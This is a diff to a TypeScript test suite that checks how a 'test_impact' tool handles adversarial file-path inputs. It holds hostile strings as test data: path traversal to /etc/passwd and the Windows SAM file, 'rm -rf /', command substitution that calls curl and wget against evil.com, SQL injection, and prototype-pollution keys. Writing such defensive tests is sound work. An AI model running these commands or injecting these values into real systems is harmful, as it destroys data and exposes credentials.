@@ -1,20 +1,29 @@
 import { describe, expect, test } from 'bun:test';
+import type { ToolContext } from '@opencode-ai/plugin';
+import type { ToolResult } from '../../tools/create-tool';
 import { test_impact } from '../../tools/test-impact.js';
+
+/**
+ * Helper to extract string from ToolResult
+ */
+function resultToString(result: ToolResult): string {
+	return typeof result === 'string' ? result : result.output;
+}
 
 /**
  * Helper to create a minimal ToolContext mock for testing
  */
-function createMockCtx(directory: string) {
+function createMockCtx(directory: string): ToolContext {
 	return {
 		sessionID: 'test-session',
 		messageID: 'test-message-id',
-		agent: 'test-agent' as const,
+		agent: 'test-agent',
 		directory,
 		worktree: directory,
 		abort: new AbortController().signal,
-		metadata: () => ({}),
-		ask: async () => undefined,
-	};
+		metadata: () => {},
+		ask: () => Promise.resolve(undefined as never),
+	} as unknown as ToolContext;
 }
 
 describe('test_impact — adversarial input handling', () => {
@@ -32,7 +41,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['../../../etc/passwd'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// BUG: The path traversal string appears directly in untestedFiles
 			// This proves the analyzer received the malicious path unchanged
@@ -44,7 +53,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['a/b/../../../../../../etc/passwd'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// Result contains the raw path in untestedFiles
 			expect(parsed.untestedFiles).toContain(
@@ -57,7 +66,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['..\\..\\..\\Windows\\System32\\config\\sam'] },
 				createMockCtx('C:\\project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 			expect(Array.isArray(parsed.untestedFiles)).toBe(true);
@@ -70,7 +79,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['; rm -rf /'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// BUG: The shell injection string is passed to analyzer
 			expect(parsed).toHaveProperty('untestedFiles');
@@ -82,7 +91,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['| cat /etc/passwd'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('| cat /etc/passwd');
 		});
@@ -92,7 +101,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['`wget http://evil.com`'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('`wget http://evil.com`');
 		});
@@ -102,7 +111,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['$(curl http://evil.com)'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('$(curl http://evil.com)');
 		});
@@ -114,7 +123,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['/path/with\0null'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// Null byte is passed through - analyzer treats it as a literal path
 			// The analyzer may strip or truncate at null byte
@@ -127,7 +136,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['\0\0\0/etc/passwd'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -145,7 +154,7 @@ describe('test_impact — adversarial input handling', () => {
 			);
 			const duration = Date.now() - startTime;
 
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 			// Should complete without hanging or crashing
 			expect(duration).toBeLessThan(5000);
 			expect(parsed).toHaveProperty('untestedFiles');
@@ -158,7 +167,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [longPath] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -170,7 +179,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [deepPath] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -182,7 +191,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['__proto__'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('__proto__');
 		});
@@ -192,7 +201,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['constructor'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('constructor');
 		});
@@ -202,7 +211,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['__proto__.polluted'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('__proto__.polluted');
 		});
@@ -212,7 +221,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [JSON.stringify({ __proto__: { polluter: true } })] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// The JSON string is passed as-is
 			expect(parsed).toHaveProperty('untestedFiles');
@@ -228,7 +237,7 @@ describe('test_impact — adversarial input handling', () => {
 				},
 				createMockCtx('/path with spaces/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -241,7 +250,7 @@ describe('test_impact — adversarial input handling', () => {
 				},
 				createMockCtx("/path with 'quotes'/project"),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -254,7 +263,7 @@ describe('test_impact — adversarial input handling', () => {
 				},
 				createMockCtx('/path; echo hacked/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// The working_directory with semicolon is passed through
 			expect(parsed).toHaveProperty('untestedFiles');
@@ -268,7 +277,7 @@ describe('test_impact — adversarial input handling', () => {
 				},
 				createMockCtx('/path with null'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('error');
 		});
@@ -278,7 +287,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['src/index.ts'], working_directory: '' },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -288,7 +297,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['src/index.ts'], working_directory: '/проект/日本語' },
 				createMockCtx('/проект/日本語'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -300,7 +309,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [{ file: 'src/index.ts' }] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// Object is coerced and passed to analyzer - no error thrown
 			expect(parsed).toHaveProperty('untestedFiles');
@@ -312,7 +321,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: 'not-an-array' },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.success).toBe(false);
 		});
@@ -322,7 +331,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [42, 123] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// Numbers are passed to analyzer (which coerces them to strings)
 			expect(parsed).toHaveProperty('untestedFiles');
@@ -333,7 +342,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [undefined, 'valid.ts'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -343,7 +352,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [null, 'valid.ts'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -353,7 +362,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [true, false] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -365,7 +374,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ["'; DROP TABLE users; --"] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain("'; DROP TABLE users; --");
 		});
@@ -375,7 +384,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ["' OR '1'='1"] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain("' OR '1'='1");
 		});
@@ -385,7 +394,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ["' UNION SELECT password FROM users--"] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain(
 				"' UNION SELECT password FROM users--",
@@ -397,7 +406,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['0xhexencoded'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('0xhexencoded');
 		});
@@ -416,7 +425,7 @@ describe('test_impact — adversarial input handling', () => {
 				},
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			// Malicious entries appear in untestedFiles (they don't exist as files)
 			// src/index.ts exists so it's processed, not in untestedFiles
@@ -430,7 +439,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: [] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.success).toBe(false);
 			expect(parsed.error).toContain('non-empty array');
@@ -443,7 +452,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['/path/with\u202E malicious.txt'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -453,7 +462,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['/path/with\u200B zero-width/file.ts'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain(
 				'/path/with\u200B zero-width/file.ts',
@@ -465,7 +474,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['/path/\u0301\u0327\u0302 file.ts'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed).toHaveProperty('untestedFiles');
 		});
@@ -475,7 +484,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['/path/📁/file.ts', '/path/🚀/test.ts'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain('/path/📁/file.ts');
 			expect(parsed.untestedFiles).toContain('/path/🚀/test.ts');
@@ -486,7 +495,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: ['/ｖｅｒｙ/ｗｉｄｅ/ｐａｔｈ/file.ts'] },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.untestedFiles).toContain(
 				'/ｖｅｒｙ/ｗｉｄｅ/ｐａｔｈ/file.ts',
@@ -497,7 +506,7 @@ describe('test_impact — adversarial input handling', () => {
 	describe('validation failures', () => {
 		test('missing changedFiles is rejected', async () => {
 			const result = await test_impact.execute({}, createMockCtx('/project'));
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.success).toBe(false);
 			expect(parsed.error).toContain('non-empty array');
@@ -508,7 +517,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: null },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.success).toBe(false);
 		});
@@ -518,7 +527,7 @@ describe('test_impact — adversarial input handling', () => {
 				{ changedFiles: 'not-an-array' },
 				createMockCtx('/project'),
 			);
-			const parsed = JSON.parse(result);
+			const parsed = JSON.parse(resultToString(result));
 
 			expect(parsed.success).toBe(false);
 		});
